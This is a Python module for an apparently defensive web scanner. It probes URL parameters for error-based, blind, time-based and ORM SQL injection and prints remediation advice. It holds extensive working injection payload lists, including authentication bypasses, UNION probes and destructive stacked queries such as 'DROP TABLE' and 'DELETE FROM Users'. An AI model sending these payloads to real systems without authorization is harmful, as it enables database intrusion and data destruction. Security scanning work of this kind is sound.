# scanner/injection/sqli.py
"""
SQL Injection Scanner

Detects SQL injection vulnerabilities including:
- Error-based SQL injection
- Boolean-based blind SQL injection  
- Time-based blind SQL injection
- UNION-based SQL injection
- ORM Injection (Hibernate HQL, JPA JPQL)

OWASP: A05:2025 - Injection
CWE-89: SQL Injection
CWE-564: SQL Injection: Hibernate
"""

import re
import asyncio
from typing import List, Dict, Optional
import aiohttp

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory


class SQLInjectionScanner(BaseScanner):
    """Comprehensive SQL Injection vulnerability scanner"""
    
    name = "SQL Injection Scanner"
    description = "Detects SQL injection vulnerabilities including error-based, blind, time-based, and ORM injection"
    owasp_category = OWASPCategory.A05_INJECTION
    
    # SQL Injection payloads organized by technique
    ERROR_BASED_PAYLOADS = [
        # Basic quotes
        ("'", "Single quote"),
        ('"', "Double quote"),
        ("'--", "Quote with comment"),
        ("';--", "Quote semicolon comment"),
        ("' OR '1'='1", "OR true condition"),
        ("' OR '1'='1'--", "OR true with comment"),
        ("' OR '1'='1'/*", "OR true with block comment"),
        ('" OR "1"="1', "Double quote OR"),
        ('" OR "1"="1"--', "Double quote OR with comment"),
        
        # Syntax errors
        ("' AND ''='", "Unbalanced quote"),
        ("1' ORDER BY 1--", "ORDER BY 1"),
        ("1' ORDER BY 10--", "ORDER BY 10"),
        ("1' ORDER BY 100--", "ORDER BY 100 (error expected)"),
        
        # UNION based
        ("' UNION SELECT NULL--", "UNION 1 column"),
        ("' UNION SELECT NULL,NULL--", "UNION 2 columns"),
        ("' UNION SELECT NULL,NULL,NULL--", "UNION 3 columns"),
        ("' UNION SELECT NULL,NULL,NULL,NULL--", "UNION 4 columns"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION 5 columns"),
        ("1' UNION SELECT @@version--", "UNION version (MySQL)"),
        ("1' UNION SELECT version()--", "UNION version (PostgreSQL)"),
        
        # Stacked queries
        ("'; SELECT 1--", "Stacked query"),
        ("'; DROP TABLE test--", "Stacked DROP (safe test)"),
        
        # Database specific
        ("' AND 1=CONVERT(int,@@version)--", "MSSQL CONVERT error"),
        ("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--", "Oracle error"),
        ("' AND extractvalue(1,concat(0x7e,version()))--", "MySQL extractvalue"),
        ("' AND updatexml(1,concat(0x7e,version()),1)--", "MySQL updatexml"),
    ]
    
    # === NEW: ORM/Hibernate Injection Payloads (CWE-564) ===
    ORM_INJECTION_PAYLOADS = [
        # Hibernate HQL Injection
        ("' OR '1'='1", "HQL string injection"),
        ("' OR 1=1--", "HQL boolean injection"),
        ("') OR ('1'='1", "HQL parenthesis injection"),
        ("' OR ''='", "HQL empty string"),
        
        # HQL-specific syntax
        ("' AND 1=1 AND ''='", "HQL AND injection"),
        ("admin' OR '1'='1' --", "HQL auth bypass"),
        ("' OR custID IS NOT NULL OR custID='", "HQL IS NOT NULL bypass"),
        
        # JPA JPQL Injection
        ("1 OR 1=1", "JPQL numeric injection"),
        ("' OR 'x'='x", "JPQL string injection"),
        
        # Hibernate named parameters bypass attempts
        (":param' OR '1'='1", "Named parameter injection"),
        ("?1' OR '1'='1", "Positional parameter injection"),
        
        # HQL function exploitation
        ("' AND SUBSTRING(username,1,1)='a' AND ''='", "HQL SUBSTRING"),
        ("' AND LENGTH(password)>0 AND ''='", "HQL LENGTH"),
        
        # Entity traversal in HQL
        ("' OR user.password IS NOT NULL OR ''='", "HQL entity traversal"),
        ("' OR object.property LIKE '%' OR ''='", "HQL LIKE wildcard"),
        
        # JPA Criteria API bypass (reflected in logs/errors)
        ("' OR 1=1 OR '1'='1", "Criteria API injection"),
        
        # MyBatis injection
        ("${id}' OR '1'='1", "MyBatis $ injection"),
        ("#{id}' OR '1'='1", "MyBatis # injection"),
        
        # Entity Framework (C#/.NET)
        ("'; DELETE FROM Users--", "EF stacked query"),
        ("' + '", "EF concatenation"),
    ]
    
    BOOLEAN_BASED_PAYLOADS = [
        # True conditions
        ("' AND '1'='1", True, "String true"),
        ("' AND 1=1--", True, "Numeric true"),
        ("') AND ('1'='1", True, "Parenthesis true"),
        ("' AND 'a'='a", True, "Alpha true"),
        
        # False conditions
        ("' AND '1'='2", False, "String false"),
        ("' AND 1=2--", False, "Numeric false"),
        ("') AND ('1'='2", False, "Parenthesis false"),
        ("' AND 'a'='b", False, "Alpha false"),
    ]
    
    TIME_BASED_PAYLOADS = [
        # MySQL
        ("' AND SLEEP(5)--", 5, "MySQL SLEEP"),
        ("' AND SLEEP(5) AND '1'='1", 5, "MySQL SLEEP with condition"),
        ("1' AND (SELECT SLEEP(5))--", 5, "MySQL subquery SLEEP"),
        ("'; SELECT SLEEP(5)--", 5, "MySQL stacked SLEEP"),
        ("' OR SLEEP(5)--", 5, "MySQL OR SLEEP"),
        ("1 AND SLEEP(5)", 5, "MySQL numeric SLEEP"),
        
        # PostgreSQL
        ("'; SELECT pg_sleep(5)--", 5, "PostgreSQL pg_sleep"),
        ("' AND (SELECT pg_sleep(5))--", 5, "PostgreSQL subquery sleep"),
        ("1; SELECT pg_sleep(5)--", 5, "PostgreSQL stacked sleep"),
        
        # MSSQL
        ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL WAITFOR"),
        ("' AND 1=1 WAITFOR DELAY '0:0:5'--", 5, "MSSQL conditional WAITFOR"),
        ("1; WAITFOR DELAY '0:0:5'--", 5, "MSSQL stacked WAITFOR"),
        
        # Oracle
        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5, "Oracle DBMS_PIPE"),
        
        # SQLite
        ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", 3, "SQLite heavy query"),
    ]
    
    # SQL Error patterns by database
    SQL_ERRORS = {
        'mysql': [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"Warning.*mysqli_",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE\[HY000\]",
            r"MySQL server version for the right syntax",
            r"mysqli_fetch",
            r"mysql_fetch",
            r"mysql_num_rows",
        ],
        'postgresql': [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"Warning.*PostgreSQL",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"pg_query",
            r"pg_exec",
            r"pg_connect",
        ],
        'mssql': [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_",
            r"Warning.*sqlsrv_",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient",
            r"(?s)Exception.*\WRoadhouse\.Cms\.",
            r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
            r"com\.microsoft\.sqlserver\.jdbc",
            r"ODBC SQL Server Driver",
            r"ODBC Driver.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for SQL Server",
            r"SqlException",
            r"Syntax error.*in query expression",
        ],
        'oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
            r"oracle\.jdbc",
            r"OracleException",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
        ],
        'sqlite': [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"SQLITE_ERROR",
            r"\[SQLITE_ERROR\]",
            r"sqlite3\.OperationalError",
            r"SQLite3::SQLException",
            r"org\.sqlite\.JDBC",
            r"SQLiteException",
        ],
        # === NEW: ORM-specific errors ===
        'hibernate': [
            r"org\.hibernate\.QueryException",
            r"org\.hibernate\.hql\.internal",
            r"HQL.*error",
            r"HibernateException",
            r"org\.hibernate\.exception",
            r"QuerySyntaxException",
            r"unexpected token",
            r"Invalid HQL",
            r"org\.hibernate\.query",
        ],
        'jpa': [
            r"javax\.persistence\.PersistenceException",
            r"javax\.persistence\.QueryException",
            r"EclipseLink.*Exception",
            r"org\.eclipse\.persistence",
            r"JPQL.*syntax",
            r"Invalid JPQL",
        ],
        'mybatis': [
            r"org\.apache\.ibatis",
            r"MyBatisSystemException",
            r"SqlMapClient",
            r"iBATIS",
        ],
        'entity_framework': [
            r"System\.Data\.Entity",
            r"EntityCommandExecutionException",
            r"EntitySqlException",
            r"LINQ.*Exception",
        ],
        'generic': [
            r"SQL syntax",
            r"SQL error",
            r"syntax error",
            r"Syntax error in string in query expression",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"unexpected end of SQL command",
            r"Invalid SQL statement",
            r"ODBC.*Driver.*Error",
            r"Invalid query",
            r"could not execute query",
            r"Database error",
            r"db error",
            r"Query failed",
        ]
    }
    
    async def scan(self, session: aiohttp.ClientSession, 
                   url: str, params: Dict[str, str] = None) -> List[Vulnerability]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        # Get baseline response
        try:
            baseline_response = await self.make_request(session, "GET", url, params=params)
            if not baseline_response:
                return vulnerabilities
            
            baseline_status = baseline_response.status
            baseline_body = await baseline_response.text()
            baseline_length = len(baseline_body)
        except Exception:
            return vulnerabilities
        
        # Test each parameter
        for param_name, param_value in params.items():
            # 1. Error-based detection
            error_vuln = await self._test_error_based(
                session, url, params, param_name
            )
            if error_vuln:
                vulnerabilities.append(error_vuln)
                continue  # Found vuln, skip other tests for this param
            
            # 2. ORM Injection detection (NEW)
            orm_vuln = await self._test_orm_injection(
                session, url, params, param_name
            )
            if orm_vuln:
                vulnerabilities.append(orm_vuln)
                continue
            
            # 3. Boolean-based blind detection
            boolean_vuln = await self._test_boolean_based(
                session, url, params, param_name,
                baseline_status, baseline_body, baseline_length
            )
            if boolean_vuln:
                vulnerabilities.append(boolean_vuln)
                continue
            
            # 4. Time-based blind detection
            time_vuln = await self._test_time_based(
                session, url, params, param_name
            )
            if time_vuln:
                vulnerabilities.append(time_vuln)
        
        return vulnerabilities
    
    async def _test_orm_injection(self, session: aiohttp.ClientSession,
                                   url: str, params: Dict[str, str],
                                   param_name: str) -> Optional[Vulnerability]:
        """Test for ORM/Hibernate/JPA injection (CWE-564)"""
        
        for payload, description in self.ORM_INJECTION_PAYLOADS:
            test_params = params.copy()
            original_value = test_params.get(param_name, '')
            test_params[param_name] = original_value + payload
            
            try:
                response = await self.make_request(session, "GET", url, params=test_params)
                if not response:
                    continue
                
                body = await response.text()
                
                # Check for ORM-specific errors
                for orm_type in ['hibernate', 'jpa', 'mybatis', 'entity_framework']:
                    patterns = self.SQL_ERRORS.get(orm_type, [])
                    for pattern in patterns:
                        match = re.search(pattern, body, re.IGNORECASE)
                        if match:
                            return self.create_vulnerability(
                                vuln_type="ORM Injection (Hibernate/JPA)",
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=f"ORM: {orm_type.upper()}, Error: {match.group()[:150]}",
                                description=f"ORM injection detected ({orm_type}). Even when using ORM frameworks like Hibernate, HQL/JPQL queries can be vulnerable if user input is concatenated into queries. Technique: {description}",
                                cwe_id="CWE-564",
                                cvss_score=9.8,
                                remediation=self._get_orm_remediation(orm_type),
                                references=[
                                    "https://owasp.org/www-community/attacks/SQL_Injection",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html",
                                    "https://cwe.mitre.org/data/definitions/564.html"
                                ]
                            )
                
                # Also check if it falls through to regular SQL errors
                for db_type, patterns in self.SQL_ERRORS.items():
                    if db_type in ['hibernate', 'jpa', 'mybatis', 'entity_framework']:
                        continue
                    for pattern in patterns:
                        match = re.search(pattern, body, re.IGNORECASE)
                        if match:
                            return self.create_vulnerability(
                                vuln_type="SQL Injection via ORM",
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=f"Database: {db_type.upper()}, Error: {match.group()[:150]}",
                                description=f"SQL injection detected through ORM layer. The ORM is passing unsanitized input to the underlying database.",
                                cwe_id="CWE-564",
                                cvss_score=9.8,
                                remediation=self._get_orm_remediation('generic'),
                                references=[
                                    "https://cwe.mitre.org/data/definitions/564.html"
                                ]
                            )
            except Exception:
                continue
        
        return None
    
    async def _test_error_based(self, session: aiohttp.ClientSession,
                                 url: str, params: Dict[str, str],
                                 param_name: str) -> Optional[Vulnerability]:
        """Test for error-based SQL injection"""
        
        for payload, description in self.ERROR_BASED_PAYLOADS:
            test_params = params.copy()
            original_value = test_params.get(param_name, '')
            test_params[param_name] = original_value + payload
            
            try:
                response = await self.make_request(session, "GET", url, params=test_params)
                if not response:
                    continue
                
                body = await response.text()
                
                # Check for SQL errors by database type
                for db_type, patterns in self.SQL_ERRORS.items():
                    if db_type in ['hibernate', 'jpa', 'mybatis', 'entity_framework']:
                        continue  # Skip ORM patterns in this method
                    for pattern in patterns:
                        match = re.search(pattern, body, re.IGNORECASE)
                        if match:
                            return self.create_vulnerability(
                                vuln_type="SQL Injection (Error-based)",
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=f"Database: {db_type.upper()}, Error: {match.group()[:150]}",
                                description=f"Error-based SQL injection detected. The application returns database error messages when malicious input is provided. Technique: {description}",
                                cwe_id="CWE-89",
                                cvss_score=9.8,
                                remediation=self._get_remediation(db_type),
                                references=[
                                    "https://owasp.org/www-community/attacks/SQL_Injection",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                                    "https://portswigger.net/web-security/sql-injection"
                                ]
                            )
            except Exception:
                continue
        
        return None
    
    async def _test_boolean_based(self, session: aiohttp.ClientSession,
                                   url: str, params: Dict[str, str],
                                   param_name: str, baseline_status: int,
                                   baseline_body: str, baseline_length: int) -> Optional[Vulnerability]:
        """Test for boolean-based blind SQL injection"""
        
        true_responses = []
        false_responses = []
        
        for payload, expected_true, description in self.BOOLEAN_BASED_PAYLOADS:
            test_params = params.copy()
            original_value = test_params.get(param_name, '')
            test_params[param_name] = original_value + payload
            
            try:
                response = await self.make_request(session, "GET", url, params=test_params)
                if not response:
                    continue
                
                body = await response.text()
                status = response.status
                length = len(body)
                
                if expected_true:
                    true_responses.append({
                        'payload': payload,
                        'status': status,
                        'length': length,
                        'body': body,
                        'description': description
                    })
                else:
                    false_responses.append({
                        'payload': payload,
                        'status': status,
                        'length': length,
                        'body': body,
                        'description': description
                    })
            except Exception:
                continue
        
        # Analyze responses
        if true_responses and false_responses:
            true_lengths = [r['length'] for r in true_responses]
            false_lengths = [r['length'] for r in false_responses]
            
            avg_true_length = sum(true_lengths) / len(true_lengths) if true_lengths else 0
            avg_false_length = sum(false_lengths) / len(false_lengths) if false_lengths else 0
            
            length_diff = abs(avg_true_length - avg_false_length)
            
            if length_diff > 50:
                true_diff_from_baseline = abs(avg_true_length - baseline_length)
                false_diff_from_baseline = abs(avg_false_length - baseline_length)
                
                if true_diff_from_baseline < false_diff_from_baseline:
                    return self.create_vulnerability(
                        vuln_type="SQL Injection (Boolean-based Blind)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=true_responses[0]['payload'],
                        evidence=f"Response length varies based on condition. True: ~{int(avg_true_length)} bytes, False: ~{int(avg_false_length)} bytes, Baseline: {baseline_length} bytes",
                        description="Boolean-based blind SQL injection detected. The application responds differently to true/false SQL conditions.",
                        cwe_id="CWE-89",
                        cvss_score=9.8,
                        remediation=self._get_remediation('generic'),
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                            "https://portswigger.net/web-security/sql-injection/blind"
                        ]
                    )
            
            true_statuses = set(r['status'] for r in true_responses)
            false_statuses = set(r['status'] for r in false_responses)
            
            if true_statuses != false_statuses:
                return self.create_vulnerability(
                    vuln_type="SQL Injection (Boolean-based Blind)",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param_name,
                    payload=true_responses[0]['payload'],
                    evidence=f"Status codes differ. True: {true_statuses}, False: {false_statuses}",
                    description="Boolean-based blind SQL injection detected via status code differences.",
                    cwe_id="CWE-89",
                    cvss_score=9.8,
                    remediation=self._get_remediation('generic'),
                    references=[
                        "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
                    ]
                )
        
        return None
    
    async def _test_time_based(self, session: aiohttp.ClientSession,
                                url: str, params: Dict[str, str],
                                param_name: str) -> Optional[Vulnerability]:
        """Test for time-based blind SQL injection"""
        
        # Establish baseline response time
        baseline_times = []
        for _ in range(3):
            try:
                start = asyncio.get_event_loop().time()
                response = await self.make_request(session, "GET", url, params=params)
                elapsed = asyncio.get_event_loop().time() - start
                if response:
                    baseline_times.append(elapsed)
            except Exception:
                pass
        
        if not baseline_times:
            return None
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        
        for payload, delay_seconds, description in self.TIME_BASED_PAYLOADS:
            test_params = params.copy()
            original_value = test_params.get(param_name, '')
            test_params[param_name] = original_value + payload
            
            try:
                start = asyncio.get_event_loop().time()
                response = await self.make_request(session, "GET", url, params=test_params)
                elapsed = asyncio.get_event_loop().time() - start
                
                if elapsed >= (delay_seconds - 1) and elapsed >= (avg_baseline + delay_seconds - 1):
                    return self.create_vulnerability(
                        vuln_type="SQL Injection (Time-based Blind)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.2f}s (expected: {delay_seconds}s, baseline: {avg_baseline:.2f}s). Technique: {description}",
                        description="Time-based blind SQL injection detected.",
                        cwe_id="CWE-89",
                        cvss_score=9.8,
                        remediation=self._get_remediation('generic'),
                        references=[
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
                        ]
                    )
                    
            except asyncio.TimeoutError:
                return self.create_vulnerability(
                    vuln_type="SQL Injection (Time-based Blind - Timeout)",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Request timed out with delay payload. Technique: {description}",
                    description="Potential time-based blind SQL injection.",
                    cwe_id="CWE-89",
                    cvss_score=8.6,
                    remediation=self._get_remediation('generic'),
                    references=[
                        "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
                    ]
                )
            except Exception:
                continue
        
        return None
    
    def _get_orm_remediation(self, orm_type: str) -> str:
        """Get ORM-specific remediation advice"""
        
        base = """
ORM Injection Prevention:
1. NEVER concatenate user input into HQL/JPQL/Criteria queries
2. Always use parameterized queries with named or positional parameters
3. Use the Criteria API or QueryDSL for dynamic queries
4. Implement input validation as defense-in-depth
5. Apply least privilege to database accounts
"""
        
        orm_specific = {
            'hibernate': """
Hibernate/HQL Specific:
- Use named parameters: query.setParameter("id", userInput)
- Use Criteria API for dynamic queries

WRONG:
  String hql = "FROM User WHERE id = '" + userInput + "'";
  
CORRECT:
  String hql = "FROM User WHERE id = :userId";
  query.setParameter("userId", userInput);
""",
            'jpa': """
JPA/JPQL Specific:
- Use TypedQuery with parameters
- Use CriteriaBuilder for complex queries

WRONG:
  String jpql = "SELECT u FROM User u WHERE u.name = '" + name + "'";

CORRECT:
  TypedQuery<User> query = em.createQuery(
      "SELECT u FROM User u WHERE u.name = :name", User.class);
  query.setParameter("name", name);
""",
            'mybatis': """
MyBatis Specific:
- Use #{} syntax (parameterized) NOT ${} (string substitution)

WRONG:
  SELECT * FROM users WHERE id = ${id}
  
CORRECT:
  SELECT * FROM users WHERE id = #{id}
""",
            'entity_framework': """
Entity Framework Specific:
- Use LINQ with parameters
- Avoid raw SQL with string concatenation

WRONG:
  var query = context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Id = {id}");
  
CORRECT:
  var query = context.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Id = {id}");
  // Or better, use LINQ:
  var user = context.Users.Where(u => u.Id == id);
"""
        }
        
        return base + orm_specific.get(orm_type, "")
    
    def _get_remediation(self, db_type: str) -> str:
        """Get database-specific remediation advice"""
        
        base_remediation = """
SQL Injection Prevention:
1. Use parameterized queries (prepared statements) for all database operations
2. Use stored procedures with parameterized inputs
3. Implement input validation with strict allowlists
4. Apply the principle of least privilege to database accounts
5. Escape special characters as a defense-in-depth measure
6. Use an ORM (Object-Relational Mapping) framework correctly
7. Implement Web Application Firewall (WAF) rules
"""
        
        db_specific = {
            'mysql': """
MySQL Specific:
  $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
  $stmt->execute([$id]);
""",
            'postgresql': """
PostgreSQL Specific:
  $result = pg_query_params($conn, 
    'SELECT * FROM users WHERE id = $1', array($id));
""",
            'mssql': """
MSSQL Specific:
  using (var cmd = new SqlCommand("SELECT * FROM users WHERE id = @id", conn))
  {
      cmd.Parameters.AddWithValue("@id", id);
  }
""",
            'oracle': """
Oracle Specific:
  EXECUTE IMMEDIATE 'SELECT * FROM users WHERE id = :1' USING v_id;
""",
            'sqlite': """
SQLite Specific:
  cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
"""
        }
        
        return base_remediation + db_specific.get(db_type, "")